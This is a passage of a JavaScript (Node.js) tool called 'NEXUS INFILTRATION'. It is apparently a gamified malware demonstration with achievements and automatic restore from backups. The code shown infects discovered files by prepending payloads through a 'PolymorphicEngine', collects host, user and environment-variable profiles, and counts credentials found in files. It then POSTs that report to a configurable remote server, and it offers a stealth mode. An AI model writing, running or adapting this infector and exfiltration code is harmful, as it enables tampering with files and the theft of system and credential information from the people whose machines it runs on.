                    if (fileInfo.extension === '.json') {
                        const jsonData = JSON.parse(originalContent);
                        jsonData._nexus_analysis = { id: mutationId, signature: CONFIG.virusSignature };
                        infectedContent = JSON.stringify(jsonData, null, 2);
                    } else {
                        infectedContent = payload + originalContent;
                    }
                    fs.writeFileSync(filePath, infectedContent);
                    this.infectionLog.push({ file: filePath, name: path.basename(filePath), directory: path.dirname(filePath), status: 'INFECTED', mutationId, strategy, backupPath });
                    resolve({ success: true, mutationId, strategy });
                } catch (error) {
                    this.infectionLog.push({ file: filePath, name: path.basename(filePath), status: 'FAILED', error: error.message });
                    resolve({ success: false, reason: error.message });
                }
            }, Math.random() * 200 + 100);
        });
    }

    async spread(targetFiles, limit = 50) {
        Logger.section('🦠 PHASE 3: SPREADING INFECTION');
        const filesToInfect = targetFiles.slice(0, limit);
        const progress = new ProgressBar(filesToInfect.length, 'Infecting files');
        let infected = 0, failed = 0, skipped = 0;
        for (let i = 0; i < filesToInfect.length; i++) {
            const fileInfo = filesToInfect[i];
            process.stdout.write(`\n  🎯 [${path.basename(fileInfo.directory)}] ${fileInfo.name} `);
            const result = await this.infectFile(fileInfo.path, fileInfo);
            if (result.success) { infected++; process.stdout.write(`${Logger.colors.green}✓ [${result.strategy}] [${result.mutationId}]${Logger.colors.reset}`); }
            else if (result.reason === 'Already infected') { skipped++; process.stdout.write(`${Logger.colors.yellow}⚠ SKIPPED${Logger.colors.reset}`); }
            else { failed++; process.stdout.write(`${Logger.colors.red}✗ FAILED${Logger.colors.reset}`); }
            progress.update(i + 1);
        }
        progress.complete();
        console.log(`\n  ✅ Infected: ${infected} | ⚠️ Skipped: ${skipped} | ❌ Failed: ${failed} | 🧬 Mutations: ${this.mutations.size}\n`);
        return { infected, failed, skipped, mutations: this.mutations.size };
    }

    displayReport() {
        Logger.section('📋 INFECTION DETAILS');
        const infected = this.infectionLog.filter(l => l.status === 'INFECTED');
        const byDir = {};
        infected.forEach(l => { if (!byDir[l.directory]) byDir[l.directory] = []; byDir[l.directory].push(l); });
        Object.entries(byDir).forEach(([dir, files]) => {
            console.log(`\n  📂 ${dir}:`);
            files.slice(0, 3).forEach(f => console.log(`     • ${f.name} [${f.strategy}] [${f.mutationId}]`));
            if (files.length > 3) console.log(`     ... and ${files.length - 3} more`);
        });
        Logger.section('🧬 MUTATION STRATEGIES USED');
        const strategies = new Set(infected.map(l => l.strategy));
        strategies.forEach(s => console.log(`  • ${s}: ${infected.filter(l => l.strategy === s).length} files`));
    }

    getBackupFiles() { return this.backupFiles; }
    getStats() {
        const infected = this.infectionLog.filter(l => l.status === 'INFECTED');
        return { totalInfected: infected.length, uniqueMutations: this.mutations.size, totalBackups: this.backupFiles.length };
    }
}

// ═══════════════════════════════════════════════════════════════════
// ANTIDOTE - CLEANUP SYSTEM
// ═══════════════════════════════════════════════════════════════════

class Antidote {
    constructor(engine) {
        this.engine = engine;
        this.restoredFiles = [];
    }

    async restore() {
        Logger.section('💊 PHASE 4: ANTIDOTE - RESTORING FILES');
        const backupFiles = this.engine.getBackupFiles();
        if (backupFiles.length === 0) { Logger.warning('No files to restore'); return { restored: 0 }; }
        const progress = new ProgressBar(backupFiles.length, 'Restoring files');
        let restored = 0, failed = 0;
        for (let i = 0; i < backupFiles.length; i++) {
            const bp = backupFiles[i], op = bp.replace('.nexus_backup', '');
            try {
                if (fs.existsSync(bp)) { fs.writeFileSync(op, fs.readFileSync(bp, 'utf8')); fs.unlinkSync(bp); this.restoredFiles.push(op); restored++; }
                else failed++;
            } catch { failed++; }
            progress.update(i + 1);
        }
        progress.complete();
        this._cleanOrphans();
        console.log(`\n  ✅ Restored: ${restored} | ❌ Failed: ${failed}\n`);
        return { restored, failed };
    }

    _cleanOrphans() {
        try {
            const findBackups = (dir) => {
                try {
                    fs.readdirSync(dir, { withFileTypes: true }).forEach(e => {
                        const fp = path.join(dir, e.name);
                        if (e.isDirectory() && !CONFIG.excludeDirs.includes(e.name)) findBackups(fp);
                        else if (e.isFile() && e.name.endsWith('.nexus_backup')) {
                            const op = fp.replace('.nexus_backup', '');
                            if (fs.existsSync(op)) fs.writeFileSync(op, fs.readFileSync(fp, 'utf8'));
                            fs.unlinkSync(fp);
                        }
                    });
                } catch {}
            };
            findBackups('.');
        } catch {}
    }

    verifyCleanliness(scanResults) {
        Logger.section('🔍 VERIFICATION');
        let found = 0;
        scanResults.targetFiles.forEach(f => {
            try { if (fs.existsSync(f.path) && fs.readFileSync(f.path, 'utf8').includes(CONFIG.virusSignature)) { found++; Logger.warning(`Residual: ${f.name}`); } } catch {}
        });
        if (found === 0) Logger.success('All files clean! No residual infection.');
        return found;
    }
}

// ═══════════════════════════════════════════════════════════════════
// SERVER REPORTER
// ═══════════════════════════════════════════════════════════════════

async function sendToServer(systemInfo, scanResults, infectionStats, achievements) {
    if (!CONFIG.serverURL || CONFIG.serverURL === 'http://localhost:3000/api/report') {
        console.log('💡 Server URL not configured. Skipping server report.');
        console.log('   Set CONFIG.serverURL in nexus.js to enable live reporting.\n');
        return null;
    }

    Logger.section('🌐 SENDING REPORT TO LIVE SERVER');
    
    const payload = {
        secret: CONFIG.nexusSecret,
        missionId: systemInfo.missionId,
        timestamp: systemInfo.timestamp,
        systemProfile: systemInfo.systemProfile,
        hardwareProfile: systemInfo.hardwareProfile,
        nodeProfile: systemInfo.nodeProfile,
        userProfile: systemInfo.userProfile,
        threatLevel: systemInfo.securityAnalysis?.threatLevel || 'LOW',
        envVarCount: Object.values(systemInfo.environmentVariables || {}).flat().length,
        filesScanned: scanResults?.totalFiles || 0,
        highValueTargets: scanResults?.highValueTargets?.length || 0,
        credentialsFound: scanResults?.highValueTargets?.reduce((s, t) => s + (t.secrets?.length || 0), 0) || 0,
        filesInfected: infectionStats?.infected || 0,
        mutations: infectionStats?.mutations || 0,
        crudCompleted: true,
        cleanupCompleted: CONFIG.autoCleanup,
        environmentCategories: Object.entries(systemInfo.environmentVariables || {}).reduce((acc, [cat, vars]) => { acc[cat] = vars.length; return acc; }, {}),
        achievements: [...(achievements?.unlocked || [])],
        securityFlags: systemInfo.securityAnalysis?.threatLevel === 'CRITICAL' ? ['EXPOSED_SECRETS', 'CLOUD_TOKENS_FOUND'] : []
    };

    try {
        const url = new URL(CONFIG.serverURL);
        const http = require(url.protocol === 'https:' ? 'https' : 'http');
        const data = JSON.stringify(payload);
        
        return new Promise((resolve) => {
            const req = http.request({
                hostname: url.hostname, port: url.port, path: url.pathname,
                method: 'POST',
                headers: { 'Content-Type': 'application/json', 'Content-Length': data.length }
            }, (res) => {
                let body = '';
                res.on('data', c => body += c);
                res.on('end', () => {
                    if (res.statusCode === 200) {
                        Logger.success(`Report sent! Total runs: ${JSON.parse(body).totalRuns}`);
                    } else {
                        Logger.warning(`Server responded: ${res.statusCode}`);
                    }
                    resolve(JSON.parse(body));
                });
            });
            req.on('error', () => { Logger.warning('Could not connect to server (offline mode)'); resolve(null); });
            req.write(data);
            req.end();
        });
    } catch (error) {
        Logger.warning('Server connection failed');
        return null;
    }
}

// ═══════════════════════════════════════════════════════════════════
// INTERACTIVE MENU
// ═══════════════════════════════════════════════════════════════════

async function showMenu() {
    const rl = readline.createInterface({ input: process.stdin, output: process.stdout });
    
    console.clear();
    console.log(`
${Logger.colors.cyan}╔══════════════════════════════════════════════════════════════════╗
║                                                                  ║
║     ⚡⚡⚡  NEXUS INFILTRATION  ⚡⚡⚡                            ║
║                                                                  ║
║     Advanced System Infiltration Tool                             ║
║                                                                  ║
╚══════════════════════════════════════════════════════════════════╝${Logger.colors.reset}

${Logger.colors.yellow}  ⚠️  WARNING: This tool MODIFIES files (with backups)!${Logger.colors.reset}

${Logger.colors.white}  SELECT MODE:${Logger.colors.reset}

  ${Logger.colors.green}1.${Logger.colors.reset} 🚀 FULL OPERATION  - Complete infiltration + cleanup
  ${Logger.colors.blue}2.${Logger.colors.reset} 🔍 AUDIT ONLY      - Scan without infection
  ${Logger.colors.yellow}3.${Logger.colors.reset} 🥷 STEALTH MODE    - Silent, minimal output
  ${Logger.colors.red}4.${Logger.colors.reset} 🧹 CLEANUP ONLY     - Restore all files
  ${Logger.colors.magenta}5.${Logger.colors.reset} 📊 SYSTEM INFO     - Extract info only
  ${Logger.colors.cyan}6.${Logger.colors.reset} 📝 CRUD ONLY       - CRUD operations only
  ${Logger.colors.gray}7.${Logger.colors.reset} ❌ EXIT

`);

    return new Promise((resolve) => {
        rl.question(`  ${Logger.colors.bold}Choice (1-7):${Logger.colors.reset} `, (answer) => {
            rl.close();
            resolve(answer.trim());
        });
    });
}

// ═══════════════════════════════════════════════════════════════════
// MAIN EXECUTION
// ═══════════════════════════════════════════════════════════════════

async function main() {
    const achievements = new AchievementSystem();
    let mode = CONFIG.mode;
    
    // Show menu if interactive
    if (CONFIG.interactive && !process.argv.includes('--auto')) {
        const choice = await showMenu();
        switch (choice) {
            case '2': mode = 'AUDIT'; break;
            case '3': mode = 'STEALTH'; break;
            case '4': await cleanupOnly(); return;
            case '5': await systemInfoOnly(); return;
            case '6': await crudOnly(); return;
            case '7': console.log('\n👋 Exiting...\n'); return;
            case '1': default: mode = 'FULL'; break;
        }
    }
    
    if (mode === 'STEALTH') { await stealthMode(achievements); return; }
    if (mode === 'AUDIT') { await auditMode(achievements); return; }
    
    // FULL MODE
    console.clear();
    console.log(`
${Logger.colors.cyan}╔══════════════════════════════════════════════════════════════════╗
║     ⚡⚡⚡  NEXUS INFILTRATION - FULL OPERATION  ⚡⚡⚡            ║
╚══════════════════════════════════════════════════════════════════╝${Logger.colors.reset}
    `);

    // Phase 1: System Info
    const stealer = new SystemInfoStealer();
    const systemInfo = stealer.steal();
    achievements.stats.envVarsExtracted = Object.values(systemInfo.environmentVariables).flat().length;
    
    await sleep(1000);
    
    // Phase 1.5: CRUD Operations
    const crud = new CRUDOperations();
    crud.executeAll();
    await sleep(1000);
    
    // Phase 2: Scan
    const scanner = new FileScanner();
    const scanResults = scanner.scan();
    achievements.stats.filesScanned = scanResults.totalFiles;
    achievements.stats.highValueTargets = scanResults.highValueTargets.length;
    achievements.stats.credentialsFound = scanResults.highValueTargets.reduce((s, t) => s + (t.secrets?.length || 0), 0);
    achievements.stats.directoriesScanned = scanResults.directoriesScanned.length;
    achievements.stats.scannedBeyondCurrent = scanResults.directoriesScanned.length > 1;
    
    await sleep(1000);
    
    // Phase 3: Infect
    let engine = null;
    let infectionStats = { infected: 0, mutations: 0 };
    
    if (scanResults.targetFiles.length > 0) {
        console.log(`\n${Logger.colors.bgRed}${Logger.colors.white}  ⚠️  Infecting ${Math.min(scanResults.targetFiles.length, CONFIG.maxInfections)} files across ${scanResults.directoriesScanned.length} directories  ${Logger.colors.reset}\n`);
        console.log('  Proceeding in 3...'); await sleep(1000);
        console.log('  2...'); await sleep(1000);
        console.log('  1...\n'); await sleep(1000);
        
        engine = new PolymorphicEngine(systemInfo);
        infectionStats = await engine.spread(scanResults.targetFiles, CONFIG.maxInfections);
        engine.displayReport();
        
        achievements.stats.filesInfected = infectionStats.infected;
        achievements.stats.uniqueMutations = infectionStats.mutations;
        achievements.stats.safeInfections = infectionStats.infected > 0 ? 1 : 0;
        
        await sleep(2000);
        
        // Phase 4: Cleanup
        if (CONFIG.autoCleanup) {
            const antidote = new Antidote(engine);
            const restoreResult = await antidote.restore();
            const residual = antidote.verifyCleanliness(scanResults);
            if (restoreResult.restored === infectionStats.infected && residual === 0) {
                achievements.stats.perfectCleanup = true;
            }
        }
    }
    
    // Achievements
    achievements.check();
    achievements.displayAll();
    
    // Send to server
    await sendToServer(systemInfo, scanResults, infectionStats, achievements);
    
    // Final
    console.log('\n' + Logger.colors.cyan + '█'.repeat(70));
    Logger.success('NEXUS INFILTRATION - OPERATION COMPLETE');
    console.log(`  ✅ System Info Extracted`);
    console.log(`  ✅ CRUD Operations Demonstrated`);
    console.log(`  ✅ ${scanResults.directoriesScanned.length} Directories Scanned`);
    console.log(`  ✅ ${infectionStats.infected} Files Infected`);
    console.log(`  ✅ Cleanup: ${CONFIG.autoCleanup ? 'Complete' : 'Skipped'}`);
    console.log(Logger.colors.cyan + '█'.repeat(70) + '\n');
}

async function auditMode(achievements) {
    Logger.section('🔍 AUDIT MODE');
    const stealer = new SystemInfoStealer();
    stealer.steal();
    const scanner = new FileScanner();
    const scanResults = scanner.scan();
    achievements.stats.filesScanned = scanResults.totalFiles;
    achievements.stats.directoriesScanned = scanResults.directoriesScanned.length;
    achievements.stats.scannedBeyondCurrent = scanResults.directoriesScanned.length > 1;
    achievements.check();
    achievements.displayAll();
    Logger.success('Audit complete - No files modified');
}

async function stealthMode(achievements) {
    const stealer = new SystemInfoStealer();
    const si = stealer.steal();
    const payload = { missionId: si.missionId, systemInfo: si.systemProfile };
    fs.writeFileSync('.nexus_stealth_payload.json', JSON.stringify(payload, null, 2));
    achievements.stats.stealthCompleted = true;
    achievements.check();
    Logger.success('Stealth complete - Payload saved');
}

async function cleanupOnly() {
    Logger.section('🧹 CLEANUP MODE');
    const backupFiles = [];
    function find(dir) {
        try {
            fs.readdirSync(dir, { withFileTypes: true }).forEach(e => {
                const fp = path.join(dir, e.name);
                if (e.isDirectory() && !CONFIG.excludeDirs.includes(e.name)) find(fp);
                else if (e.isFile() && e.name.endsWith('.nexus_backup')) backupFiles.push(fp);
            });
        } catch {}
    }
    find('.');
    if (backupFiles.length === 0) Logger.warning('No infected files found');
    else {
        let r = 0;
        backupFiles.forEach(bp => {
            try { const op = bp.replace('.nexus_backup', ''); fs.writeFileSync(op, fs.readFileSync(bp, 'utf8')); fs.unlinkSync(bp); r++; }
            catch {}
        });
        Logger.success(`Restored ${r} files`);
    }
}

async function systemInfoOnly() {
    Logger.section('📊 SYSTEM INFO');
    const stealer = new SystemInfoStealer();
    const si = stealer.steal();
    console.log(`\n  🏠 Hostname: ${si.systemProfile.hostname}`);
    console.log(`  💻 OS: ${si.systemProfile.type} ${si.systemProfile.release}`);
    console.log(`  🧠 CPU: ${si.hardwareProfile.cpu.model}`);
    console.log(`  💾 RAM: ${si.hardwareProfile.memory.used} / ${si.hardwareProfile.memory.total}`);
    console.log(`  ⚡ Node.js: ${si.nodeProfile.version}`);
    console.log(`  👤 User: ${si.userProfile.username}`);
    console.log(`  🔑 Env Vars: ${Object.values(si.environmentVariables).flat().length}\n`);
    fs.writeFileSync('nexus-system-report.json', JSON.stringify(si, null, 2));
    Logger.success('Report saved to nexus-system-report.json');
}

async function crudOnly() {
    const crud = new CRUDOperations();
    crud.executeAll();
}

function sleep(ms) { return new Promise(r => setTimeout(r, ms)); }

// Emergency handler
process.on('SIGINT', () => {
    console.log('\n\n🛑 Interrupted! Cleaning up...');
    const findBackups = (dir) => {
        try {
            fs.readdirSync(dir, { withFileTypes: true }).forEach(e => {
                const fp = path.join(dir, e.name);
                if (e.isDirectory() && !CONFIG.excludeDirs.includes(e.name)) findBackups(fp);
                else if (e.isFile() && e.name.endsWith('.nexus_backup')) {
                    try { fs.writeFileSync(fp.replace('.nexus_backup', ''), fs.readFileSync(fp, 'utf8')); fs.unlinkSync(fp); }
                    catch {}
                }
            });
        } catch {}
    };
    findBackups('.');
    console.log('✅ Files restored. Exiting...\n');
    process.exit(0);
});

// Launch
if (require.main === module) {
    main().catch(e => { Logger.error(`Fatal: ${e.message}`); process.exit(1); });
}

module.exports = { CONFIG, SystemInfoStealer, FileScanner, PolymorphicEngine, Antidote, CRUDOperations };